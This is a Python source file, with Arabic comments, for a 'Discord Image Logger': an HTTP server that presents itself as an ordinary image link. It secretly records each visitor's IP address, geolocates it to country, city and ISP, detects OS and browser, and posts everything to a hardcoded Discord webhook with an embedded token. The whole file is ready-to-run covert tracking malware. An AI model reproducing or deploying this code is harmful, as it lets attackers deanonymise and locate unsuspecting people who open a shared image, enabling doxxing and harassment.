# Discord Image Logger - نسخة ثابتة + Preview شغال

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback, requests, base64, httpagentparser, os

config = {
    "webhook": "https://discord.com/api/webhooks/1486621531974139996/qmCm0qaiJSBLHAz5Iy6FcSqh0hIqV30kVK58dY1fkII1Aeh7V2z-qs9WHs2aEJLel5uR",
    "image": "https://i.pinimg.com/1200x/31/25/10/312510d433b3bdd29f6b12ffcab62557.jpg",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "vpnCheck": 1,
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(useragent):
    if not useragent:
        return False
    if "Discordbot" in useragent or "Discord" in useragent:
        return True
    return False

def getRealIP(handler):
    ip = handler.headers.get('x-forwarded-for')
    if ip:
        ip = ip.split(",")[0].strip()
    else:
        ip = handler.client_address[0]
    return ip

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": f"Error:\n```{error}```"
        })
    except:
        pass

def makeReport(ip, useragent, url):
    if ip.startswith(blacklistedIPs):
        return

    try:
        info = requests.get(f"https://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
    except:
        info = {}

    os_name, browser = httpagentparser.simple_detect(useragent or "")

    data = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "IP Logged",
            "color": config["color"],
            "description": f"""
**IP:** {ip}
**Country:** {info.get('country', 'N/A')}
**City:** {info.get('city', 'N/A')}
**ISP:** {info.get('isp', 'N/A')}

**OS:** {os_name}
**Browser:** {browser}
"""
        }]
    }

    try:
        requests.post(config["webhook"], json=data)
    except:
        pass

class ImageLoggerAPI(BaseHTTPRequestHandler):

    def do_GET(self):
        try:
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

            url = config["image"]
            if config["imageArgument"] and (dic.get("url") or dic.get("id")):
                try:
                    url = base64.b64decode(dic.get("url") or dic.get("id")).decode()
                except:
                    pass

            useragent = self.headers.get('user-agent')
            ip = getRealIP(self)

            # 🔥 هذا أهم جزء (preview للديسكورد)
            if botCheck(useragent):
                self.send_response(200)
                self.send_header('Content-type', 'image/jpeg')
                self.end_headers()

                try:
                    img = requests.get(url, timeout=5).content
                    self.wfile.write(img)
                except:
                    pass

                makeReport(ip, useragent, url)
                return

            # 👤 المستخدم العادي
            makeReport(ip, useragent, url)

            html = f'''
            <html>
            <head>
            <meta property="og:image" content="{url}">
            </head>
            <body style="margin:0">
            <img src="{url}" style="width:100%;height:100%;object-fit:contain;">
            </body>
            </html>
            '''

            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            try:
                self.wfile.write(html.encode())
            except:
                pass

        except Exception:
            self.send_response(500)
            self.end_headers()
            try:
                self.wfile.write(b"Error")
            except:
                pass
            reportError(traceback.format_exc())


PORT = int(os.environ.get("PORT", 8000))
server = HTTPServer(("0.0.0.0", PORT), ImageLoggerAPI)

print(f"Server running on port {PORT}")
server.serve_forever()
